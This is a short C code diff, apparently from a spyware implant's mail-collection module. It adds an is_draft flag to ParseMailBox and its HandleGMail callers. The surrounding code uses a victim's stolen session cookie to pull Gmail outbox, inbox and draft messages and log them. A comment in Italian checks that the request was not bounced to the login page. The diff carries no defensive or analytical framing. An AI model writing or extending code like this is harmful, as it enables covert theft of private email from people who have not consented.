@@ -82,7 +82,7 @@ DWORD ParseContacts(char *cookie, char *ik_val, WCHAR *user_name)
 	return SOCIAL_REQUEST_SUCCESS;
 }
 
-DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi, DWORD last_tstamp_lo, BOOL is_incoming)
+DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi, DWORD last_tstamp_lo, BOOL is_incoming, BOOL is_draft)
 {
 	DWORD ret_val;
 	BYTE *r_buffer = NULL;
@@ -139,7 +139,7 @@ DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi,
 			response_len = max_social_mail_len;
 		// Verifica che non mi abbia risposto con la pagina di login
 		if (r_buffer_inner && response_len>0 && strstr((char *)r_buffer_inner, "Received: "))
-			LogSocialMailMessageFull(MAIL_GMAIL, r_buffer_inner, response_len, is_incoming);
+			LogSocialMailMessageFull(MAIL_GMAIL, r_buffer_inner, response_len, is_incoming, is_draft);
 		else {
 			SAFE_FREE(r_buffer_inner);
 			break;
@@ -288,7 +288,7 @@ DWORD HandleGMail(char *cookie)
 		return ret_val;
 
 	last_tstamp_lo = GetLastFBTstamp(ik_val, &last_tstamp_hi);
-	ParseMailBox(GM_OUTBOX_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo, FALSE);
-	ParseMailBox(GM_INBOX_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo, TRUE);
-	return ParseMailBox(GM_DRAFTS_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo, FALSE);
+	ParseMailBox(GM_OUTBOX_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo, FALSE, FALSE);
+	ParseMailBox(GM_INBOX_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo, TRUE, FALSE);
+	return ParseMailBox(GM_DRAFTS_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo, FALSE, TRUE);
 }
